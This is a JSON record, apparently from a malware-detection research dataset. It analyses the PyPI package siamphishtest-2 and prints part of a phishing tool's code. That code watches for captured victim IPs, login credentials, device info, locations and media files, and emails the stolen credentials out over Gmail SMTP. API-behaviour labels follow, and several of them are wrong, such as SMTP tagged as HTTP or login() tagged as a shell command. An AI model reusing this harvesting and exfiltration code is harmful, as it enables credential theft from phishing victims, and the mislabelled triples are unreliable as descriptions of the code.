{
  "metadata": {
    "package_name": "siamphishtest-2",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/siamphishtest-2.1.8-py3-none-any.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "linux.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/siamphishtest-2.1.8-py3-none-any/siam/linux.py",
      "code_snippets": [
        {
          "snippet": "from smtplib import SMTP_SSL as smtp\n\n# ... (other code omitted for brevity)\n\n# Send mail by smtp library\ndef send_mail(msg):\n    global email, password, receiver\n    message = f\"From: {email}\\nTo: {receiver}\\nSubject: \\x4d\\x61\\x78\\x50\\x68\\x69\\x73\\x68\\x65\\x72 Login Credentials\\n\\n{msg}\"\n    try:\n        internet()\n        with smtp('smtp.gmail.com', 465) as server:\n            server.login(email, password)\n            server.sendmail(email, receiver, message) \n    except Exception as e:\n        append(e, error_file)\n        print(f\"{error}{str(e)}\")\n\n# ... (other code omitted for brevity)\n\ndef waiter():\n    global is_mail_ok\n    delete(ip_file, cred_file, log_file)\n    for file in get_media():\n        remove(file)\n    sprint(f\"\\n{info}{blue}Waiting for login info....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n    try:\n        while True:\n            if isfile(ip_file):\n                print(f\"\\n\\n{success}{bgreen}Victim IP found!\\n\\007\")\n                show_file_data(ip_file)\n                ipdata = cat(ip_file)\n                append(ipdata, main_ip)\n                # Just add the ip\n                append(ipdata.split(\"\\n\")[0], saved_file)\n                print(f\"\\n{info2}Saved in {main_ip}\")\n                print(f\"\\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n                remove(ip_file)\n            if isfile(cred_file):\n                print(f\"\\n\\n{success}{bgreen}Victim login info found!\\n\\007\")\n                show_file_data(cred_file)\n                userdata = cat(cred_file)\n                if is_mail_ok:\n                    send_mail(userdata)\n                append(userdata, main_cred)\n                append(userdata, saved_file)\n                add_json(text2json(userdata), cred_json)\n                print(f\"\\n{info2}Saved in {main_cred}\")\n                print(f\"\\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n                remove(cred_file)\n            if isfile(info_file):\n                print(f\"\\n\\n{success}{bgreen}Victim Info found!\\n\\007\")\n                show_file_data(info_file)\n                info_data = cat(info_file)\n                append(info_data, main_info)\n                add_json(text2json(info_data), info_json)\n                print(f\"\\n{info2}Saved in {main_info}\")\n                print(f\"\\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n                remove(info_file)\n            if isfile(location_file):\n                print(f\"\\n\\n{success}{bgreen}Victim Location found!\\n\\007\")\n                show_file_data(location_file)\n                location_data = cat(location_file)\n                append(location_data, main_location)\n                add_json(text2json(location_data), location_json)\n                print(f\"\\n{info2}Saved in {main_location}\")\n                print(f\"\\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n                remove(location_file)\n            if isfile(log_file):\n                print(f\"\\n{success}{bgreen}Media file captured!\\007\")\n                for file in get_media():\n                    copy(file, directory)\n                    remove(file)\n                    print(f\"\\n{info2}{green}{basename(file)} {cyan}saved in {green}{directory}\")\n                print(f\"\\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n                if get_media()==[]:\n                    remove(log_file)\n            sleep(0.75)\n    except KeyboardInterrupt:\n        pexit()\n",
          "triple_sequences": [
            {
              "action_api": "smtp()",
              "action_description": "Creates HTTP connection to specified host",
              "action_id": "create_http_connection",
              "object": "'smtp.gmail.com', 465",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Establish connection",
              "intention_id": "establish_connection"
            },
            {
              "action_api": "server.login()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "email, password",
              "object_description": "Account name and token",
              "object_id": "account_credentials",
              "intention_description": "Access authentication cookie",
              "intention_id": "check_authentication_cookie"
            },
            {
              "action_api": "server.sendmail()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "email, receiver, message",
              "object_description": "Account name and token",
              "object_id": "account_credentials",
              "intention_description": "Send data to server",
              "intention_id": "send_data_server"
            },
            {
              "action_api": "delete()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "ip_file, cred_file, log_file",
              "object_description": "Local file or directory name",
              "object_id": "local_file_or_directory_name",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "get_media()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "ip_file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Determine presence of file",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "show_file_data()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "ip_file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "cat()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "ip_file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "append()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "ipdata, main_ip",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "append()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "ipdata.split(\"\\n\")[0], saved_file",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "ip_file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "cred_file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Determine presence of file",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "show_file_data()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "cred_file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "cat()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "cred_file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "send_mail()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "userdata",
              "object_description": "Account name and token",
              "object_id": "account_credentials",
              "intention_description": "Send data to server",
              "intention_id": "send_data_server"
            },
            {
              "action_api": "append()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "userdata, main_cred",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "append()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "userdata, saved_file",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "text2json()",
              "action_description": "Serializes Python object to JSON string",
              "action_id": "serialize_to_json",
              "object": "userdata",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "add_json()",
              "action_description": "Serializes Python object to JSON string",
              "action_id": "serialize_to_json",
              "object": "text2json(userdata), cred_json",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "cred_file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "info_file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Determine presence of file",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "show_file_data()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "info_file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "cat()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "info_file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "append()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "info_data, main_info",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "text2json()",
              "action_description": "Serializes Python object to JSON string",
              "action_id": "serialize_to_json",
              "object": "info_data",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "add_json()",
              "action_description": "Serializes Python object to JSON string",
              "action_id": "serialize_to_json",
              "object": "text2json(info_data), info_json",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "info_file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "location_file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Determine presence of file",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "show_file_data()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "location_file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "cat()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "location_file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "append()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "location_data, main_location",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "text2json()",
              "action_description": "Serializes Python object to JSON string",
              "action_id": "serialize_to_json",
              "object": "location_data",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "add_json()",
              "action_description": "Serializes Python object to JSON string",
              "action_id": "serialize_to_json",
              "object": "text2json(location_data), location_json",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "location_file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "log_file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Determine presence of file",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "get_media()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "copy()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "file, directory",
              "object_description": "Local file or directory",
              "object_id": "local_file_or_directory",
              "intention_description": "Copy file to temporary directory",
              "intention_id": "copy_file_temp_directory"
            },
            {
              "action_api": "remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "get_media()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "log_file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "0.75",
              "object_description": "Delay duration in seconds",
              "object_id": "delay_duration",
              "intention_description": "Pause execution",
              "intention_id": "pause_execution"
            },
            {
              "action_api": "pexit()",
              "action_description": "Exits program",
              "action_id": "exit_program",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Terminate program execution",
              "intention_id": "terminate_program_execution"
            }
          ]
        }
      ]
    }
  ]
}